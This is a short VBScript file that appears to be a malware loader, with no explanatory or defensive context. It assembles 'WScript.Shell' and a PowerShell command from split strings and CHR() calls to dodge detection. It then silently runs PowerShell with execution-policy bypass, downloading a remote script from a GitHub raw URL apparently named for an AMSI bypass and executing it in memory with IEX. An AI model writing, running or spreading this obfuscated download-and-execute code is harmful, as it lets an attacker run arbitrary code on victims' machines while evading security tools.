HBBBB= "W"&"s"&"c"&"r"&"i"&CHR(80)&"t."&"s"&"h"&"E"&"l"&"l"
Set objShell = CreateObject(HBBBB)
HB = "CMD.EXE /C PO"_
&"W"_
&CHR(69)_
&"RSH"_
&"ELL.EXE -ex"_
&"ec Bypass -C  IEX(N"_
&"ew-Object Net.Webclient).D"_
&"ownloadString('https://raw.githubusercontent.com/lookupdate/soprano/main/AMSI_PE.txt')"
objShell.Run(HB),0